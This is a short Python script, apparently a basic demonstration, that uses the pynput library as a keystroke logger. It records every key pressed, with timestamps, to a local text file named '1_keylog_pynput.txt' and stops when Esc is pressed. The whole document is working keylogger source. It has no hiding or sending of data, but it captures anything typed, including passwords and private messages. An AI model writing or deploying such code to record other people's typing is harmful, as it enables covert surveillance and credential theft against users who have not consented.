from pynput.keyboard import Key, Listener
import logging


logging.basicConfig(filename=('1_keylog_pynput.txt'), level=logging.DEBUG, format="%(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


def on_release(key):
    print(f'{key} released')

    # Stop listener
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
